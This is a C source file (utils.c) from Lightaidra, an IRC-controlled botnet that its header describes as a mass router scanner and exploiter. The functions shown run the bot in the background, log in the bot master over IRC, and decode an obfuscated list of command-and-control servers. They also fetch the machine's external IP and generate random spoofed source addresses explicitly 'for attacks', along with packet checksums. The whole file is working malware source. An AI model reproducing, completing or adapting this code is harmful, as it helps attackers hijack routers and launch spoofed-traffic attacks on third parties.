/*
 * utils.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

void __alarm();
void decode();

/* daemonize(void)               */
/* set Aidra in background mode. */
void daemonize() {
    daemonize_pid = fork();
    if (daemonize_pid) exit(EXIT_SUCCESS);
}

/* sockwrite(int, const char *) */
/* socket send function.        */
int sockwrite(int sd, const char *fmt, ...) {
    char s_buf[sizebuf];
    va_list args;

    va_start(args, fmt);
    vsnprintf(s_buf, sizebuf - 1, fmt, args);
    va_end(args);

    if (send(sd, s_buf, strlen(s_buf), MSG_NOSIGNAL) < true) return EXIT_FAILURE;

    return EXIT_SUCCESS;
}

/* getrstr(void)                */
/* return a random char string. */
char *getrstr() {
    char rdnick[] = { "0ab1cd2ef3gh4il5mn6op7qr8st9uvz_wyjkx" };
    char nm[16];
    int nc;

    data_ptr = (char *)malloc(15);

    memset(nm, 0, sizeof nm);
    srand(time(0));

    for (nc = 0; nc < 10; nc++) {
        nm[nc] = rdnick[rand()%strlen(rdnick)];
    }

    snprintf(data_ptr, 15, "%s%s", irc_nick_prefix, nm);
    return data_ptr;
}

/* wordcmp(const char *, requests_t *) */
/* a menu strncmp function.            */
int wordcmp(const char *s, requests_t *req) {
    if (strlen(req->rcv_sa)) {
        if (strncmp(req->rcv_sa, s, strlen(s)) == true && strlen(req->rcv_sa) == strlen(s))
            return EXIT_SUCCESS;
    }

    return EXIT_FAILURE;
}

/* wordcmp(const char *, requests_t *) */
/* a menu strncmp function.            */
int wordcmpp(const char *s, requests_t *req) {
    if (strlen(req->rcv_sa) == strlen(s)+1) {
        if (strcmp(req->rcv_sa, s)) return EXIT_SUCCESS;
    }

    return EXIT_FAILURE;
}

/* twordcmp(const char *, requests_t *) */
/* a topic strncmp function.            */
int twordcmp(const char *s, requests_t *req) {
    if (strncmp(s, req->rcv_sb, strlen(s)) == true) return EXIT_SUCCESS;
    return EXIT_FAILURE;
}

/* login(sock_t *, requests_t *) */
/* log in party-line bot.        */
int login(sock_t *sp, requests_t *req) {
    if (strstr(req->rcv_a, master_host)) {
        if (strncmp(master_password, req->rcv_sb, strlen(master_password)) == true) {
            sockwrite(sp->sockfd, "PRIVMSG %s :[login] you are logged in, (%s).\n", channel, req->rcv_a + 1);
            return EXIT_SUCCESS;
        } 
        else {
            sockwrite(sp->sockfd, "PRIVMSG %s :[!login] sorry, wrong authenthication password!\n", channel);
        }
    }

    return EXIT_FAILURE;
}

/* login_control(requests_t *)   */
/* check if user is logged in.   */
int login_control(requests_t *req) {
    if (strstr(req->rcv_a, master_host)) return EXIT_SUCCESS;
    
    return EXIT_FAILURE;
}

/* getextip(sock_t *, requests_t *) */
/* get extern ip address.                */
int getextip(sock_t *sp, requests_t *req) {
    int a, b, x = 0;
    char temp[512], *tok;
    sock_t *gfd;

    gfd = (sock_t *) malloc(sizeof(sock_t));
    gfd->sockhs = gethostbyname(ipreq);
    gfd->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    gfd->sockadr.sin_family = AF_INET;
    gfd->sockadr.sin_port = htons(http_port);

    gfd->sockadr.sin_addr = *((struct in_addr *)gfd->sockhs->h_addr);

    memset(gfd->sockadr.sin_zero, '\0', sizeof gfd->sockadr.sin_zero);

    if (connect(gfd->sockfd, (struct sockaddr *)&gfd->sockadr, sizeof gfd->sockadr) == false) {
        close(gfd->sockfd);
        free(gfd);
        return EXIT_FAILURE;
    }

    send(gfd->sockfd, IPREQUEST, strlen(IPREQUEST), 0);
    memset(temp, 0, sizeof temp);
    recv(gfd->sockfd, temp, sizeof(temp)-1, 0);

    x = 0;
    tok = strtok(temp, "\n\n");
    
    while (tok != NULL) {
        if (x == 10) {
            sscanf(tok, "%d.%d.%*s.%*s", &a,&b);
            snprintf(req->rcv_sb, 4, "%d", a);
            snprintf(req->rcv_sc, 4, "%d", b);

            if (a > 255 || b > 255) return EXIT_FAILURE;    

            close(gfd->sockfd);
            free(gfd);
            return EXIT_SUCCESS;
        }
        
        x++;
        tok = strtok(NULL, "\n");
    }

    close(gfd->sockfd);
    free(gfd);

    return EXIT_FAILURE;
}

/* in_cksum(unsigned short *, int)       */
/* create a checksum for ipheader.       */
/* i've found that function with google. */
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    
    return answer;
}

/* host2ip(char *)                       */
/* convert hostname to ip address.       */
/* i've found that function with google. */
unsigned int host2ip(char *hostname) {

    static struct in_addr i;
    struct hostent *h;

    i.s_addr = inet_addr((const char *)hostname);
    
    if (i.s_addr == -1) {
        h = gethostbyname(hostname);

        if (h == NULL) exit(0);
        
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }

    return i.s_addr;
}

/* parse_input_errors(sock_t *, requests_t *) */
/* check for input errors.                    */
int parse_input_errors(sock_t *sp, requests_t *req, 
unsigned short argn, unsigned short et) {
    int x = 0, y = 0;
    char error_tags[3][32] = {
        { 'a', 'b', 'c', 'd', 'e', 'f',
        'g', 'h', 'i', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't',
        'u', 'v', 'z', 'y', 'w', 'k', 
        'x', 'j', '!', '?', ',',  0 },
        { '.', ',', '?', '!', 0 }
    };

    while (error_tags[et][x] != 0) {
        if (strchr(req->rcv_sb, error_tags[et][x])) y++;
        if (argn == 2 || argn == 3 || argn == 4) {
            if (strchr(req->rcv_sc, error_tags[et][x])) y++;
        }
        
        if (argn == 3 || argn == 4) {
            if (strchr(req->rcv_sd, error_tags[et][x])) y++;
        }
        
        if (argn == 4) {
            if (strchr(req->rcv_se, error_tags[et][x])) y++;
        }

        if (y > 0) {
            sockwrite(sp->sockfd, "PRIVMSG %s :[error] one error in your input data, see help!\n", channel);
            return EXIT_FAILURE;
        }

        x++;
    }

    return EXIT_SUCCESS;
}

/* create_irc_servlist()      */
/* create a irc servers list. */
void create_irc_servlist() {
    unsigned short x = 0;
    char s_copy[512], *token;

    memset(s_copy, 0, sizeof s_copy);
    if (encirc != 0) {
        decode(enc_servers, 0);
        strncpy(s_copy, decodedsrv, sizeof(s_copy));
    }
    else {
        strncpy(s_copy, irc_servers, sizeof(s_copy));
    }

    token = strtok(s_copy, "|");

    while (token != NULL) {
        if (x <= 10) {
            strncpy(isrv[x], token, 31);
            x++;
        }

        token = strtok(NULL, "|");
    }

    total = x-2;
    return;
}

/* get_spoofed_addr()                    */
/* return a spoofed address for attacks. */
unsigned int get_spoofed() {
    char spa[21];
    int a, b, c, d;

    srand(time(0));

    random_ct = rand();
    random_num = ((random_ct % 254) + 1);
    a = random_num;

    random_ct = rand();
    random_num = ((random_ct % 254) + 1);
    b = random_num;

    random_ct = rand();
    random_num = ((random_ct % 254) + 1);
    c = random_num;

    random_ct = rand();
    random_num = ((random_ct % 254) + 1);
    d = random_num;

    snprintf(spa, sizeof(spa), "%d.%d.%d.%d", a, b, c, d);

    return ((unsigned int)host2ip(spa));
}

/* pidprocess()     */
/* check for clones */
void pidprocess() {
    FILE *pidfd;
    unsigned int pidc;

    if (!access(pidfile, F_OK) && !access(pidfile, R_OK)) {
        if ((pidfd = fopen(pidfile, "r+")) != NULL) {
            fscanf(pidfd, "%d", &pidc);
            fclose(pidfd);
            kill(pidc, SIGKILL);
            remove(pidfile);
        }
    }

    if ((pidfd = fopen(pidfile, "a+")) != NULL) {
        fprintf(pidfd, "%d", getpid());
        fclose(pidfd);
    }

    return;
}

/* decode()                         */
/* a function to decode irc servers */
/* encoded by ircencode.c tool      */
void decode(char *str, int dtype) {
    char decoded[512];
    int x = 0, i = 0, c;

    char encodes[] = { 
        '<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', 
        '|', 'A', 'B', '&', '%', '$', 'D', '"', '!', 'w', 'k', 'y', 'x', 'z', 'v', 'u', 
        't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 
        'b', 'a', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'F', 'U', 'C', 'K'
    };

    char decodes[] = { 
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
        'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', 
        'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', 
        'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', '*'
    };

    memset(decoded, 0, sizeof(decoded));
    
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                if (!dtype) decodedsrv[i] = decodes[c];
                else decodedpsw[i] = decodes[c];
            
                i++;
            }
        }

        x++;
    }

    return;
}
